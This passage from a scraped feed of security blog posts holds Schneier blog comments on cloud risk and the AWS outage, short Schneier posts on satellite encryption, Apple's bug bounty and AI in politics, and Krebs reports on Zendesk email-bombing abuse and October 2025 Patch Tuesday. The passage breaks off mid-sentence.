Provider.\n2, Hands over all tenants personal details they know to the Service Provider.\nWhilst not illegal for a landlord to do, the tenant can be sanctioned by the landlord in various ways if the tenant does not want to pay/play with that Service Provider.\nThe new law kills a big chunk of this scheme, thus the outcry not just from large Service Providers who disproportionately charge excessively and landlords in who’s financial interest it is to get the equivalent of “payola”.\nInterestingly the article does not cover the privacy and security aspects that this law will allow tenants in MTEs the freedom they don’t currently have to acquire.\nlurker • October 19, 2025 7:08 PM\nSomebody’s awake:\nNZ lawyers have written to the Prime Minister saying the country’s reliance on cloud computing and storage will result in catastrophic [uninsurable] and unrecoverable risks of harm.\nClive Robinson • October 20, 2025 1:20 AM\n@ lurker, ALL,\nHow late to the funeral…\nYou note,\n“Somebody’s awake”\nBut that is now, and the funeral[1] was years ago…\nThe things they are saying many of us “old grey beards” were saying befor “XasS” –where X is storage / software / etc– started to be called “cloud” and very specifically warning about all the problems that have been repeatedly seen and are still seeing with these “services” not least of which is that they are a waste of\n“Organisational resources to no longterm benefit only increased risk”\nAs yhe old saw has it,\n“If you want a job done properly then do it yourself.”\nBy which they mean you have to be the one in charge and control, not as is the case with Cloud, not the dirty/skanky end of a “service level agreement” written by and for the benefit of a service provider agent.\nThe thing is it’s not just “liability and insurance” that are a problem, if the service provider looses or makes unavailable your data, your business not theirs goes “belly up”. It’s you and your shareholders that take the hit not yours.\nThink about AWS they were a running joke here with the “usual suspects” not that long ago. Because of AWS’s so numerous “screw ups”… yet they were effectively “teflon” no matter what they did wrong. Or how much harm they caused, etc, etc.\nDare I mention MicroSoft and it’s various disaster areas that are considered “cloud”?\nHow many others do I need to mention like Alphabet?\nWe knew way back that such online services were going to be a disaster almost immediately, and so it turned out to be. Such disasters are “so common” that they are now “normalised” and nobody bothers mentioning when another disaster happens. Just as has happened with Self Driving vehicles and is happening with LLM&ML. The have become nolonger “news worth” but “yawn worthy” in a “So what, who cares” society.\nIf you want to see a prime example of this it’s Web3, despite all the warnings people keep throwing money in and having it stolen or misappropriated in some way.\nI mention Molly White and her site where she records the Web3 “crypto, NFT, etc disasters” she gets to hear about. But generally you don’t find mentioned else where because millions being stolen this way is in the opinion of the MSM journalists/editors “just not worth reporting”…\nIt’s the same with “Cloud” and you can see it’s already started with AI, which is just a disaster through and through and the “When” of “If and When” has already started because the “IF” has such high probability it’s effectively “already” happened before the starters gate has opened.\nSuch ICTfails are so numerous these days I can not see what “OnLine technology” is not going to suffer the same fate… And politicians want to put everything critical to a nation state in that “fail zone” so they can “look with it” whilst holding a fat brown envelope from tech lobbyists behind their back.\n[1] For those not living in the UK and several other nations, there is a saying about those who are, shall we say, more than a little tardy…\nSo you say to them,\n“You’d be late for your own funeral”\nWinter • October 20, 2025 4:26 AM\n@lurker\nSomebody’s awake:\nMore like: Waking up\nNZ lawyers have written to the Prime Minister saying the country’s reliance on cloud computing and storage will result in catastrophic [uninsurable] and unrecoverable risks of harm.\nCloud computing is like utilities. A power grid is much, much more efficient than everyone using their own generators [1]. Communal tap water is way better than each one digging their own well.\nBut such utilities require strong laws and strong oversight. Whenever there is lax regulation, disaster looms. The Texas Freeze and Flint water crisis are just two recent examples.\nWhat we see now is “cloud” computing/storage being used universally as a utility. The increase of efficiency is phenomenal. The operational savings match this. But the oversight is absent. And without strong oversight, utilities are a disaster waiting to happen.\nIt is just recently that people start to notice that “no cloud”, or a “poisoned cloud” has become as big a disaster as no tap water, no electricity, or no garbage collection.\nYears too late, we know. But humans seem to strongly prefer to bolt the doors only after the horses have run.\n[1] Unlike some US Republicans want to tell us:\n‘https://ktxs.com/news/local/colorado-city-mayor-resigns-after-controversial-facebook-post\nWinter • October 20, 2025 12:34 PM\n@lurker\nNZ lawyers have written to the Prime Minister saying the country’s reliance on cloud computing and storage will result in catastrophic [uninsurable] and unrecoverable risks of harm.\nAmazon obliges us by showing the problem in full size, as if on demand.\nClive Robinson • October 20, 2025 4:49 PM\n@ Winter, ALL,\nYou forgot a link to a news story on the AWS Face Palm… So,\nthat’s fixed 😉\nBut it’s kind of odd, I mention AWS bad behaviour above with,\n“Think about AWS they were a running joke here with the “usual suspects” not that long ago. Because of AWS’s so numerous “screw ups”… yet they were effectively “teflon” no matter what they did wrong. Or how much harm they caused, etc, etc.”\nAnd then they go and prove me a truth-teller beyond doubt by throwing a US & EU blackout of lots of sites. According to the Bleepingcomputer News item,\n“AWS outage has taken down millions of websites, including Amazon.com, Prime Video, Perplexity AI, Canva and more.\nThe outage started approx 30 minutes ago[1] and it’s affecting consumers in all regions, including the United States and Europe.”\nYup all jolly good fun, posibly a DNS issue we will just have to wait and see if AWS tell the truth (but don’t hold your breath unless you think “blue in the face” is a good look…\n[1] Actually it started a little before 04:00 Mon 20th Oct, if you are reading this later.\nnot important • October 20, 2025 5:44 PM\n@Clive: as I expected with probability close to 100%, Moderator (by own discretion or following offer can’t reject) deleted my yesterday made post related to Article 5 of NATO Charter interpretation and so called independence of Australia, Canada, New Zealand.\nDo you recall this statement from old movie ‘You want the truth? You can’t handle the truth.’ I could only add ugly truth in particular. Deleted post was probably used for training AI what should be filtered out. That is echo chamber mode.\nlurker • October 20, 2025 7:19 PM\n@Clive Robinson, ALL\n“possibly DNS related”\nNow DNS probably means something different to AWS than it does to us mere mortals, but also\n“If you want a job done properly then do it yourself.”\nwhich is why I’m so much happier with pdnsd\nWinter • October 20, 2025 11:54 PM\n@lurker, Clive\nRe: AWS outage\nThe Register has two “insightful” [1] articles. It’s not “just DNS”, it’s also centralization and very bad HRM.\nAWS outage exposes Achilles heel: central control plane\nToo many services depend not just on one cloud provider, but on one location\n“Although the impacted region is in the AWS US East region, many global services (including those used in Europe) depend on infrastructure or control-plane / cross-region features located in US-EAST-1. This means that even if the European region was unaffected in terms of its own availability zones, dependencies could still cause knock-on impact,” he said.\nToday is when the Amazon brain drain finally sent AWS down the spout\nWhen your best engineers log off for good, don’t be surprised when the cloud forgets how DNS works\n- Internal documents reportedly say that Amazon suffers from 69 percent to 81 percent regretted attrition across all employment levels. In other words, “people quitting who we wish didn’t.”\n- The internet is full of anecdata of senior Amazonians lamenting the hamfisted approach of their Return to Office initiative; experts have weighed in citing similar concerns.\n[1] It’s The Register, so caveat emptor\nClive Robinson • October 21, 2025 3:04 AM\n@ Winter, lurker,\nI suspected DNS from the very wide spread symptoms. Put overly simply sometimes things are so wide spread the logical conclusion is it’s something they all have in common and that often means something fundemental like an OS or service/supply issue OS’s are dependent on.\nWe know there are more than three OS types hit but where things were working they did not break for a while.\nSo something everyone is dependent on, and something only used as a initial / startup step in communications that has “sticky/tacky” information held locally.\nWhich kind of points at DNS or related issues (I’m still erring toward “related” as insufficient hard info so still “hedging my bets” as they say 😉\nWhich is why the “human element” issue you mention is not just fairly believable, we’ve seen “Quiet Quitting” and similar become rather more than just a label in recent times.\nBut that also brings up other news of interest with regards “Human Element” issues.\nI can not get hard info on this but it does not in the least surprise me,\nhttps://intelnews.org/2025/10/20/01-3416/\nFurther I would not be surprised if “the US receiving agencies” have not been doing similar with regards the “top layer that has been “pushed on” from above.\nBut this “Madness of King George” issue is being seen in other places. As you know I’ve been watching Palantir and it’s boss for quite some time and the plans/behaviours that are odd even by US standards,\nhttps://futurism.com/future-society/peter-thiel-antichrist-lectures\nBut there are signs that this might be “catching” and hitting other Big Tech leaders. They do say “it’s a thin line between genius and madness” and “power corrupts and absolute power corrupts absolutely”. It’s not just the mania for building and staying close to “five year bunkers” at the “last bus stop to the South Pole” “south islands”. There is the more obvious “back to office” demands that are so “out of date” and organisationally debilitating. Driven by what can only be described in terms we find more normally attached to “Strong Man”, “Authoritarian leader” type extreme idiology politics that heralded WWII and now is becoming much in evidence again a century later. Worse the almost medieval “Estates of Man” type resurgence, that I’ve mentioned as being part of the “King Game” and like wise the behaviour patterns of “Barons and Bishops” that we had hoped had disappeared pre-industrialisation. Which was most exemplified by the “You will own nothing and be…” That some try to paint up as utopian,\n‘https://medium.com/world-economic-forum/welcome-to-2030-i-own-nothing-have-no-privacy-and-life-has-never-been-better-ee2eed62f710\nBut let’s be honest, human history tells us it will be anything but idyllic. The “Grind the faces of the poor in the dirt” outlook has been an almost constant with humanity and those that get called “Hawks” not “Doves”. Even supposed “Saints” on analysis are found to have the same outlook, that is people used as a means to an end of personal power etc. As I warn from time to time beware the “Humble Servant”.\nClive Robinson • October 21, 2025 5:16 AM\n@ not important,\nThanks for the thanks etc.\n@ ALL,\nA security failure that I’ve found an easy example to demonstrate purely by chance.\nWe all get told “the rules of passwords” but how many realise the same rules should also apply to usernames?\nYes it’s true, the “authentication token” is USUALLY “two part” and it is ASSUMED by security people with checklists that,\n“As long as one is strong…”\nBut ordinary users do not see things that way in fact we are rarely sure how they see things.\nSo what happens if “two part” nolonger holds?\nWell I can give a real world example, with “throw away email addresses”.\nThese are used by people for very good reason and I’ve talked about it when mentioning ICT implementors do not support “roles in life”. That is most have “A work life”, “A home life”, and “A social life” that when you think about it “are separate roles and should be kept separate”. Technologists have what is a perverse view that,\n“everything should be lumped together”\nAnd that is a major security fail.\nSo people use “throwaway email” addresses…\nWhich is problematic. There are a number of services that are popular.\nOne of which is,\nIt has “usernames” but not “passwords”. It goes down a different route of “two user names” a public one that is “send to only” and a private one that “allows read access”. I’ll assume that the public one is some kind of anonymization hash of the private one.\nBut what if a user choses a private username that does not follow all the “password rules”?\nTry entering just an ordinary name such as,\nFerdinand\nOpps…\nnobody • October 21, 2025 6:28 AM\n@not important: as I expected with probability close to 100%, Moderator (by own discretion or following offer can’t reject) deleted my yesterday made post related to Article 5 of NATO Charter interpretation and so called independence of Australia, Canada, New Zealand.\nWas you post polite enough? if so, why don’t you try splitting it up into smaller pieces and post them individually?\nWinter • October 21, 2025 8:21 AM\n@Clive\nthat is people used as a means to an end of personal power\nThat is the whole point of hierarchy. Humans are obligate social animals, no less social than ants and honeybees. We need other humans to fulfill our psychological, mental, and bodily needs. But we care only for those we know personally, and then only some of those we know personally.\nIn principle, you can assume that a person in power that does not know you personally, will not care for you in any positive meaning of care. However, this person might very well need you, or rather your attention, money, vote, or work. As they don’t care about you personally, they will use you and take what they need from you, irrespective of what you think of that.\nAbsolute power corrupts absolutely follows from this psycho-economic basis.\nThe ultimate form of this affliction is narcissism.\nIt is telling that a majority of American voters selected a ridiculous obvious narcissist as their leader. It aligns well with the long tradition of adoration and worshiping wealth and wealthy people above all.\nIt looks like Mammon is currently the most openly worshiped god in the US.\nIt is a very brutal truth, but in the end:\nEvery nation gets the government it deserves\nSubscribe to comments on this entry\nSidebar photo of Bruce Schneier by Joe MacInnis.", "timestamp": "2025-10-21T13:35:01.287760"}
{"source": "blog", "feed": "https://www.schneier.com/feed/", "title": "A Surprising Amount of Satellite Traffic Is Unencrypted", "url": "https://www.schneier.com/blog/archives/2025/10/a-surprising-amount-of-satellite-traffic-is-unencrypted.html", "published": "Fri, 17 Oct 2025 11:03:53 +0000", "content": "A Surprising Amount of Satellite Traffic Is Unencrypted\nHere’s the summary:\nWe pointed a commercial-off-the-shelf satellite dish at the sky and carried out the most comprehensive public study to date of geostationary satellite communication. A shockingly large amount of sensitive traffic is being broadcast unencrypted, including critical infrastructure, internal corporate and government communications, private citizens’ voice calls and SMS, and consumer Internet traffic from in-flight wifi and mobile networks. This data can be passively observed by anyone with a few hundred dollars of consumer-grade hardware. There are thousands of geostationary satellite transponders globally, and data from a single transponder may be visible from an area as large as 40% of the surface of the earth.", "timestamp": "2025-10-21T13:35:01.812946"}
{"source": "blog", "feed": "https://www.schneier.com/feed/", "title": "Apple’s Bug Bounty Program", "url": "https://www.schneier.com/blog/archives/2025/10/apples-bug-bounty-program.html", "published": "Wed, 15 Oct 2025 11:02:18 +0000", "content": "Apple’s Bug Bounty Program\nApple is now offering a $2M bounty for a zero-click exploit. According to the Apple website:\nToday we’re announcing the next major chapter for Apple Security Bounty, featuring the industry’s highest rewards, expanded research categories, and a flag system for researchers to objectively demonstrate vulnerabilities and obtain accelerated awards.\n- We’re doubling our top award to $2 million for exploit chains that can achieve similar goals as sophisticated mercenary spyware attacks. This is an unprecedented amount in the industry and the largest payout offered by any bounty program we’re aware of and our bonus system, providing additional rewards for Lockdown Mode bypasses and vulnerabilities discovered in beta software, can more than double this reward, with a maximum payout in excess of $5 million. We’re also doubling or significantly increasing rewards in many other categories to encourage more intensive research. This includes $100,000 for a complete Gatekeeper bypass, and $1 million for broad unauthorized iCloud access, as no successful exploit has been demonstrated to date in either category.\n- Our bounty categories are expanding to cover even more attack surfaces. Notably, we’re rewarding one-click WebKit sandbox escapes with up to $300,000, and wireless proximity exploits over any radio with up to $1 million.\n- We’re introducing Target Flags, a new way for researchers to objectively demonstrate exploitability for some of our top bounty categories, including remote code execution and Transparency, Consent, and Control (TCC) bypasses and to help determine eligibility for a specific award. Researchers who submit reports with Target Flags will qualify for accelerated awards, which are processed immediately after the research is received and verified, even before a fix becomes available.", "timestamp": "2025-10-21T13:35:02.853927"}
{"source": "blog", "feed": "https://www.schneier.com/feed/", "title": "Upcoming Speaking Engagements", "url": "https://www.schneier.com/blog/archives/2025/10/upcoming-speaking-engagements-49.html", "published": "Tue, 14 Oct 2025 16:01:11 +0000", "content": "Upcoming Speaking Engagements\nThis is a current list of where and when I am scheduled to speak:\n- Nathan E. Sanders and I will be giving a book talk on Rewiring Democracy at the Harvard Kennedy School’s Ash Center in Cambridge, Massachusetts, USA, on October 22, 2025, at noon ET.\n- Nathan E. Sanders and I will be speaking and signing books at the Cambridge Public Library in Cambridge, Massachusetts, USA, on October 22, 2025, at 6:00 PM ET. The event is sponsored by Harvard Bookstore.\n- Nathan E. Sanders and I will give a virtual talk about our book Rewiring Democracy on October 23, 2025, at 1:00 PM ET. The event is hosted by Data & Society.\n- I’m speaking at the Ted Rogers School of Management in Toronto, Ontario, Canada, on Thursday, October 29, 2025, at 1:00 PM ET.\n- Nathan E. Sanders and I will give a virtual talk about our book Rewiring Democracy on November 3, 2025, at 2:00 PM ET. The event is hosted by the Boston Public Library.\n- I’m speaking at the World Forum for Democracy in Strasbourg, France, November 5-7, 2025.\n- I’m speaking and signing books at the University of Toronto Bookstore in Toronto, Ontario, Canada, on November 14, 2025. Details to come.\n- Nathan E. Sanders and I will be speaking at the MIT Museum in Cambridge, Massachusetts, USA, on December 1, 2025, at 6:00 pm ET.\n- Nathan E. Sanders and I will be speaking at a virtual event hosted by City Lights on the Zoom platform, on December 3, 2025, at 6:00 PM PT.\n- I’m speaking and signing books at the Chicago Public Library in Chicago, Illinois, USA, on February 5, 2026. Details to come.\nThe list is maintained on this page.", "timestamp": "2025-10-21T13:35:03.374009"}
{"source": "blog", "feed": "https://www.schneier.com/feed/", "title": "The Trump Administration’s Increased Use of Social Media Surveillance", "url": "https://www.schneier.com/blog/archives/2025/10/the-trump-administrations-increased-use-of-social-media-surveillance.html", "published": "Tue, 14 Oct 2025 11:09:54 +0000", "content": "The Trump Administration’s Increased Use of Social Media Surveillance\nThis chilling paragraph is in a comprehensive Brookings report about the use of tech to deport people from the US:\nThe administration has also adapted its methods of social media surveillance. Though agencies like the State Department have gathered millions of handles and monitored political discussions online, the Trump administration has been more explicit in who it’s targeting. Secretary of State Marco Rubio announced a new, zero-tolerance “Catch and Revoke” strategy, which uses AI to monitor the public speech of foreign nationals and revoke visas of those who “abuse [the country’s] hospitality.” In a March press conference, Rubio remarked that at least 300 visas, primarily student and visitor visas, had been revoked on the grounds that visitors are engaging in activity contrary to national interest. A State Department cable also announced a new requirement for student visa applicants to set their social media accounts to public—reflecting stricter vetting practices aimed at identifying individuals who “bear hostile attitudes toward our citizens, culture, government, institutions, or founding principles,” among other criteria.", "timestamp": "2025-10-21T13:35:03.898034"}
{"source": "blog", "feed": "https://www.schneier.com/feed/", "title": "Rewiring Democracy is Coming Soon", "url": "https://www.schneier.com/blog/archives/2025/10/rewiring-democracy-is-coming-soon.html", "published": "Mon, 13 Oct 2025 16:36:38 +0000", "content": "Rewiring Democracy is Coming Soon\nMy latest book, Rewiring Democracy: How AI Will Transform Our Politics, Government, and Citizenship, will be published in just over a week. No reviews yet, but you can read chapters 12 and 34 (of 43 chapters total).\nYou can order the book pretty much everywhere, and a copy signed by me here.\nPlease help spread the word. I want this book to make a splash when it’s public. Leave a review on whatever site you buy it from. Or make a TikTok video. Or do whatever you kids do these days. Is anyone a Slashdot contributor? I’d like the book to be announced there.", "timestamp": "2025-10-21T13:35:04.417201"}
{"source": "blog", "feed": "https://www.schneier.com/feed/", "title": "AI and the Future of American Politics", "url": "https://www.schneier.com/blog/archives/2025/10/ai-and-the-future-of-american-politics.html", "published": "Mon, 13 Oct 2025 11:04:31 +0000", "content": "AI and the Future of American Politics\nTwo years ago, Americans anxious about the forthcoming 2024 presidential election were considering the malevolent force of an election influencer: artificial intelligence. Over the past several years, we have seen plenty of warning signs from elections worldwide demonstrating how AI can be used to propagate misinformation and alter the political landscape, whether by trolls on social media, foreign influencers, or even a street magician. AI is poised to play a more volatile role than ever before in America’s next federal election in 2026. We can already see how different groups of political actors are approaching AI. Professional campaigners are using AI to accelerate the traditional tactics of electioneering; organizers are using it to reinvent how movements are built; and citizens are using it both to express themselves and amplify their side’s messaging. Because there are so few rules, and so little prospect of regulatory action, around AI’s role in politics, there is no oversight of these activities, and no safeguards against the dramatic potential impacts for our democracy.\nThe Campaigners\nCampaigners—messengers, ad buyers, fundraisers, and strategists—are focused on efficiency and optimization. To them, AI is a way to augment or even replace expensive humans who traditionally perform tasks like personalizing emails, texting donation solicitations, and deciding what platforms and audiences to target.\nThis is an incremental evolution of the computerization of campaigning that has been underway for decades. For example, the progressive campaign infrastructure group Tech for Campaigns claims it used AI in the 2024 cycle to reduce the time spent drafting fundraising solicitations by one-third. If AI is working well here, you won’t notice the difference between an annoying campaign solicitation written by a human staffer and an annoying one written by AI.\nBut AI is scaling these capabilities, which is likely to make them even more ubiquitous. This will make the biggest difference for challengers to incumbents in safe seats, who see AI as both a tacitly useful tool and an attention-grabbing way to get their race into the headlines. Jason Palmer, the little-known Democratic primary challenger to Joe Biden, successfully won the American Samoa primary while extensively leveraging AI avatars for campaigning.\nSuch tactics were sometimes deployed as publicity stunts in the 2024 cycle; they were firsts that got attention. Pennsylvania Democratic Congressional candidate Shamaine Daniels became the first to use a conversational AI robocaller in 2023. Two long-shot challengers to Rep. Don Beyer used an AI avatar to represent the incumbent in a live debate last October after he declined to participate. In 2026, voters who have seen years of the official White House X account posting deepfaked memes of Donald Trump will be desensitized to the use of AI in political communications.\nStrategists are also turning to AI to interpret public opinion data and provide more fine-grained insight into the perspective of different voters. This might sound like AIs replacing people in opinion polls, but it is really a continuation of the evolution of political polling into a data-driven science over the last several decades.\nA recent survey by the American Association of Political Consultants found that a majority of their members’ firms already use AI regularly in their work, and more than 40 percent believe it will “fundamentally transform” the future of their profession. If these emerging AI tools become popular in the midterms, it won’t just be a few candidates from the tightest national races texting you three times a day. It may also be the member of Congress in the safe district next to you, and your state representative, and your school board members.\nThe development and use of AI in campaigning is different depending on what side of the aisle you look at. On the Republican side, Push Digital Group is going “all in” on a new AI initiative, using the technology to create hundreds of ad variants for their clients automatically, as well as assisting with strategy, targeting, and data analysis. On the other side, the National Democratic Training Committee recently released a playbook for using AI. Quiller is building an AI-powered fundraising platform aimed at drastically reducing the time campaigns spend producing emails and texts. Progressive-aligned startups Chorus AI and BattlegroundAI are offering AI tools for automatically generating ads for use on social media and other digital platforms. DonorAtlas automates data collection on potential donors, and RivalMind AI focuses on political research and strategy, automating the production of candidate dossiers.\nFor now, there seems to be an investment gap between Democratic- and Republican-aligned technology innovators. Progressive venture fund Higher Ground Labs boasts $50 million in deployed investments since 2017 and a significant focus on AI. Republican-aligned counterparts operate on a much smaller scale. Startup Caucus has announced one investment—of $50,000—since 2022. The Center for Campaign Innovation funds research projects and events, not companies. This echoes a longstanding gap in campaign technology between Democratic- and Republican-aligned fundraising platforms ActBlue and WinRed, which has landed the former in Republicans’ political crosshairs.\nOf course, not all campaign technology innovations will be visible. In 2016, the Trump campaign vocally eschewed using data to drive campaign strategy and appeared to be falling way behind on ad spending, but was—we learned in retrospect—actually leaning heavily into digital advertising and making use of new controversial mechanisms for accessing and exploiting voters’ social media data with vendor Cambridge Analytica. The most impactful uses of AI in the 2026 midterms may not be known until 2027 or beyond.\nThe Organizers\nBeyond the realm of political consultants driving ad buys and fundraising appeals, organizers are using AI in ways that feel more radically new.\nThe hypothetical potential of AI to drive political movements was illustrated in 2022 when a Danish artist collective used an AI model to found a political party, the Synthetic Party, and generate its policy goals. This was more of an art project than a popular movement, but it demonstrated that AIs—synthesizing the expressions and policy interests of humans—can formulate a political platform. In 2025, Denmark hosted a “summit” of eight such AI political agents where attendees could witness “continuously orchestrate[d] algorithmic micro-assemblies, spontaneous deliberations, and impromptu policy-making” by the participating AIs.\nThe more viable version of this concept lies in the use of AIs to facilitate deliberation. AIs are being used to help legislators collect input from constituents and to hold large-scale citizen assemblies. This kind of AI-driven “sensemaking” may play a powerful role in the future of public policy. Some research has suggested that AI can be as or more effective than humans in helping people find common ground on controversial policy issues.\nAnother movement for “Public AI” is focused on wresting AI from the hands of corporations to put people, through their governments, in control. Civic technologists in national governments from Singapore, Japan, Sweden, and Switzerland are building their own alternatives to Big Tech AI models, for use in public administration and distribution as a public good.\nLabor organizers have a particularly interesting relationship to AI. At the same time that they are galvanizing mass resistance against the replacement or endangerment of human workers by AI, many are racing to leverage the technology in their own work to build power.\nSome entrepreneurial organizers have used AI in the past few years as tools for activating, connecting, answering questions for, and providing guidance to their members. In the UK, the Centre for Responsible Union AI studies and promotes the use of AI by unions; they’ve published several case studies. The UK Public and Commercial Services Union has used AI to help their reps simulate recruitment conversations before going into the field. The Belgian union ACV-CVS has used AI to sort hundreds of emails per day from members to help them respond more efficiently. Software companies such as Quorum are increasingly offering AI-driven products to cater to the needs of organizers and grassroots campaigns.\nBut unions have also leveraged AI for its symbolic power. In the U.S., the Screen Actors Guild held up the specter of AI displacement of creative labor to attract public attention and sympathy, and the ETUC (the European confederation of trade unions) developed a policy platform for responding to AI.\nFinally, some union organizers have leveraged AI in more provocative ways. Some have applied it to hacking the “bossware” AI to subvert the exploitative intent or disrupt the anti-union practices of their managers.\nThe Citizens\nMany of the tasks we’ve talked about so far are familiar use cases to anyone working in office and management settings: writing emails, providing user (or voter, or member) support, doing research.\nBut even mundane tasks, when automated at scale and targeted at specific ends, can be pernicious. AI is not neutral. It can be applied by many actors for many purposes. In the hands of the most numerous and diverse actors in a democracy—the citizens—that has profound implications.\nConservative activists in Georgia and Florida have used a tool named EagleAI to automate challenging voter registration en masse (although the tool’s creator later denied that it uses AI). In a nonpartisan electoral management context with access to accurate data sources, such automated review of electoral registrations might be useful and effective. In this hyperpartisan context, AI merely serves to amplify the proclivities of activists at the extreme of their movements. This trend will continue unabated in 2026.\nOf course, citizens can use AI to safeguard the integrity of elections. In Ghana’s 2024 presidential election, civic organizations used an AI tool to automatically detect and mitigate electoral disinformation spread on social media. The same year, Kenyan protesters developed specialized chatbots to distribute information about a controversial finance bill in Parliament and instances of government corruption.\nSo far, the biggest way Americans have leveraged AI in politics is in self-expression. About ten million Americans have used the chatbot Resistbot to help draft and send messages to their elected leaders. It’s hard to find statistics on how widely adopted tools like this are, but researchers have estimated that, as of 2024, about one in five consumer complaints to the U.S. Consumer Financial Protection Bureau was written with the assistance of AI.\nOpenAI operates security programs to disrupt foreign influence operations and maintains restrictions on political use in its terms of service, but this is hardly sufficient to deter use of AI technologies for whatever purpose. And widely available free models give anyone the ability to attempt this on their own.\nBut this could change. The most ominous sign of AI’s potential to disrupt elections is not the deepfakes and misinformation. Rather, it may be the use of AI by the Trump administration to surveil and punish political speech on social media and other online platforms. The scalability and sophistication of AI tools give governments with authoritarian intent unprecedented power to police and selectively limit political speech.\nWhat About the Midterms?\nThese examples illustrate AI’s pluripotent role as a force multiplier. The same technology used by different actors—campaigners, organizers, citizens, and governments—leads to wildly different impacts. We can’t know for sure what the net result will be. In the end, it will be the interactions and intersections of these uses that matters, and their unstable dynamics will make future elections even more unpredictable than in the past.\nFor now, the decisions of how and when to use AI lie largely with individuals and the political entities they lead. Whether or not you personally trust AI to write an email for you or make a decision about you hardly matters. If a campaign, an interest group, or a fellow citizen trusts it for that purpose, they are free to use it.\nIt seems unlikely that Congress or the Trump administration will put guardrails around the use of AI in politics. AI companies have rapidly emerged as among the biggest lobbyists in Washington, reportedly dumping $100 million toward preventing regulation, with a focus on influencing candidate behavior before the midterm elections. The Trump administration seems open and responsive to their appeals.\nThe ultimate effect of AI on the midterms will largely depend on the experimentation happening now. Candidates and organizations across the political spectrum have ample opportunity—but a ticking clock—to find effective ways to use the technology. Those that do will have little to stop them from exploiting it.\nThis essay was written with Nathan E. Sanders, and originally appeared in The American Prospect.", "timestamp": "2025-10-21T13:35:04.949865"}
{"source": "blog", "feed": "https://krebsonsecurity.com/feed/", "title": "Email Bombs Exploit Lax Authentication in Zendesk", "url": "https://krebsonsecurity.com/2025/10/email-bombs-exploit-lax-authentication-in-zendesk/", "published": "Fri, 17 Oct 2025 11:26:27 +0000", "content": "Cybercriminals are abusing a widespread lack of authentication in the customer service platform Zendesk to flood targeted email inboxes with menacing messages that come from hundreds of Zendesk corporate customers simultaneously.\nZendesk is an automated help desk service designed to make it simple for people to contact companies for customer support issues. Earlier this week, KrebsOnSecurity started receiving thousands of ticket creation notification messages through Zendesk in rapid succession, each bearing the name of different Zendesk customers, such as CapCom, CompTIA, Discord, GMAC, NordVPN, The Washington Post, and Tinder.\nThe abusive missives sent via Zendesk’s platform can include any subject line chosen by the abusers. In my case, the messages variously warned about a supposed law enforcement investigation involving KrebsOnSecurity.com, or else contained personal insults.\nMoreover, the automated messages that are sent out from this type of abuse all come from customer domain names — not from Zendesk. In the example below, replying to any of the junk customer support responses from The Washington Post’s Zendesk installation shows the reply-to address is help@washpost.com.\nNotified about the mass abuse of their platform, Zendesk said the emails were ticket creation notifications from customer accounts that configured their Zendesk instance to allow anyone to submit support requests — including anonymous users.\n“These types of support tickets can be part of a customer’s workflow, where a prior verification is not required to allow them to engage and make use of the Support capabilities,” said Carolyn Camoens, communications director at Zendesk. “Although we recommend our customers to permit only verified users to submit tickets, some Zendesk customers prefer to use an anonymous environment to allow for tickets to be created due to various business reasons.”\nCamoens said requests that can be submitted in an anonymous manner can also make use of an email address of the submitter’s choice.\n“However, this method can also be used for spam requests to be created on behalf of third party email addresses,” Camoens said. “If an account has enabled the auto-responder trigger based on ticket creation, then this allows for the ticket notification email to be sent from our customer’s accounts to these third parties. The notification will also include the Subject added by the creator of these tickets.”\nZendesk claims it uses rate limits to prevent a high volume of requests from being created at once, but those limits did not stop Zendesk customers from flooding my inbox with thousands of messages in just a few hours.\n“We recognize that our systems were leveraged against you in a distributed, many-against-one manner,” Camoens said. “We are actively investigating additional preventive measures. We are also advising customers experiencing this type of activity to follow our general security best practices and configure an authenticated ticket creation workflow.”\nIn all of the cases above, the messaging abuse would not have been possible if Zendesk customers validated support request email addresses prior to sending responses. Failing to do so may make it easier for Zendesk clients to handle customer support requests, but it also allows ne’er-do-wells to sully the sender’s brand in service of disruptive and malicious email floods.", "timestamp": "2025-10-21T13:35:07.721159"}
{"source": "blog", "feed": "https://krebsonsecurity.com/feed/", "title": "Patch Tuesday, October 2025 ‘End of 10’ Edition", "url": "https://krebsonsecurity.com/2025/10/patch-tuesday-october-2025-end-of-10-edition/", "published": "Tue, 14 Oct 2025 22:57:38 +0000", "content": "Microsoft today released software updates to plug a whopping 172 security holes in its Windows operating systems, including at least two vulnerabilities that are already being actively exploited. October’s Patch Tuesday also marks the final month that Microsoft will ship security updates for Windows 10 systems. If you’re running a Windows 10 PC and you’re unable or unwilling to migrate to Windows 11, read on for other options.\nThe first zero-day bug addressed this month (CVE-2025-24990) involves a third-party modem driver called Agere Modem that’s been bundled with Windows for the past two decades. Microsoft responded to active attacks on this flaw by completely removing the vulnerable driver from Windows.\nThe other zero-day is CVE-2025-59230, an elevation of privilege vulnerability in Windows Remote Access Connection Manager (also known as RasMan), a service used to manage remote network connections through virtual private networks (VPNs) and dial-up networks.\n“While RasMan is a frequent flyer on Patch Tuesday, appearing more than 20 times since January 2022, this is the first time we’ve seen it exploited in the wild as a zero day,” said Satnam Narang, senior staff research engineer at Tenable.\nNarang notes that Microsoft Office users should also take note of CVE-2025-59227 and CVE-2025-59234, a pair of remote code execution bugs that take advantage of “Preview Pane,” meaning that the target doesn’t even need to open the file for exploitation to occur. To execute these flaws, an attacker would social engineer a target into previewing an email with a malicious Microsoft Office document.\nSpeaking of Office, Microsoft quietly announced this week that Microsoft Word will now automatically save documents to OneDrive, Microsoft’s cloud platform. Users who are uncomfortable saving all of their documents to Microsoft’s cloud can change this in Word’s settings; ZDNet has a useful how-to on disabling this feature.\nKev Breen, senior director of threat research at Immersive, called attention to CVE-2025-59287, a critical remote code execution bug in the Windows Server Update Service (WSUS) — the very same Windows service responsible for downloading security patches for Windows Server versions. Microsoft says there are no signs this weakness is being exploited yet. But with a threat score of 9.8 out of possible 10 and marked “exploitation more likely,” CVE-2025-59287 can be exploited without authentication and is an easy “patch now” candidate.\n“Microsoft provides limited information, stating that an unauthenticated attacker with network access can send untrusted data to the WSUS server, resulting in deserialization and code execution,” Breen wrote. “As WSUS is a trusted Windows service that is designed to update privileged files across the file system, an attacker would have free rein over the operating system and could potentially bypass some EDR detections that ignore or exclude the WSUS service.”\nFor more on other fixes from Redmond today, check out the SANS Internet Storm Center monthly roundup, which indexes all of the updates by severity and urgency.\nWindows 10 isn’t the only Microsoft OS that is reaching end-of-life today; Exchange Server 2016, Exchange Server 2019, Skype for Business 2016, Windows 11 IoT Enterprise Version 22H2, and Outlook 2016 are some of the other products that Microsoft is sunsetting today.\nIf you’re running any 